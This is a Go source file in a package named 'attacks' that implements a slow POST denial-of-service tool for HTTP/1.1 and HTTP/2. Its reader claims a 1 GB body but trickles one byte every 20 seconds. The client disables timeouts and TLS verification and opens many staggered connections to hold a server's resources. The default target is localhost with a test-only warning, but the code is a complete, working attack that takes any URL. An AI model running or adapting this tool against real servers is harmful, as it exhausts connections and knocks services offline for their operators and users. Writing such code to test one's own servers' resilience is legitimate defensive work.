package attacks

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"

	"golang.org/x/net/http2"
)

// SlowReader implements io.Reader that sends data extremely slowly
type SlowReader struct {
	dataSize  int64
	sent      int64
	chunkSize int
	delay     time.Duration
}

func (s *SlowReader) Read(p []byte) (n int, err error) {
	if s.sent >= s.dataSize {
		return 0, io.EOF
	}

	// Send only a small chunk at a time
	toSend := s.chunkSize
	if int64(toSend) > s.dataSize-s.sent {
		toSend = int(s.dataSize - s.sent)
	}

	// Fill buffer with dummy data
	for i := 0; i < toSend && i < len(p); i++ {
		p[i] = 'A'
	}

	s.sent += int64(toSend)

	// Introduce delay to make it slow
	time.Sleep(s.delay)

	return toSend, nil
}

// HTTP/1.1 Slow POST
func slowPostHTTP1(targetURL string) error {
	client := &http.Client{
		Timeout: 0, // No timeout
	}

	// Claim we'll send 1GB of data
	slowReader := &SlowReader{
		dataSize:  1000000000,
		sent:      0,
		chunkSize: 1,                // Send 1 byte at a time
		delay:     20 * time.Second, // 20 seconds between bytes
	}

	req, err := http.NewRequest("POST", targetURL, slowReader)
	if err != nil {
		return err
	}

	req.ContentLength = slowReader.dataSize
	req.Header.Set("Content-Type", "application/octet-stream")

	fmt.Println("Sending slow HTTP/1.1 POST request...")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	fmt.Printf("Response: %s\n", resp.Status)
	return nil
}

// HTTP/2 Slow POST
func slowPostHTTP2(targetURL string) error {
	// Create HTTP/2 client
	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // Only for testing
		},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   0,
	}

	slowReader := &SlowReader{
		dataSize:  1000000000,
		sent:      0,
		chunkSize: 1,
		delay:     20 * time.Second,
	}

	req, err := http.NewRequest("POST", targetURL, slowReader)
	if err != nil {
		return err
	}

	req.ContentLength = slowReader.dataSize
	req.Header.Set("Content-Type", "application/octet-stream")

	fmt.Println("Sending slow HTTP/2 POST request...")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	fmt.Printf("Response: %s\n", resp.Status)
	return nil
}

// Simulate multiple slow connections
func multipleSlowConnections(targetURL string, count int, useHTTP2 bool) {
	fmt.Printf("Opening %d slow connections to %s\n", count, targetURL)

	for i := 0; i < count; i++ {
		go func(id int) {
			fmt.Printf("Connection %d started\n", id)
			var err error
			if useHTTP2 {
				err = slowPostHTTP2(targetURL)
			} else {
				err = slowPostHTTP1(targetURL)
			}
			if err != nil {
				fmt.Printf("Connection %d error: %v\n", id, err)
			}
		}(i)

		time.Sleep(100 * time.Millisecond) // Stagger connection starts
	}

	// Keep main goroutine alive
	select {}
}

func main() {
	// WARNING: Only use on your own test servers
	targetURL := "http://localhost:8080/upload"

	// Test single slow connection
	// slowPostHTTP1(targetURL)

	// Test multiple slow connections (more realistic attack simulation)
	multipleSlowConnections(targetURL, 10, false)
}
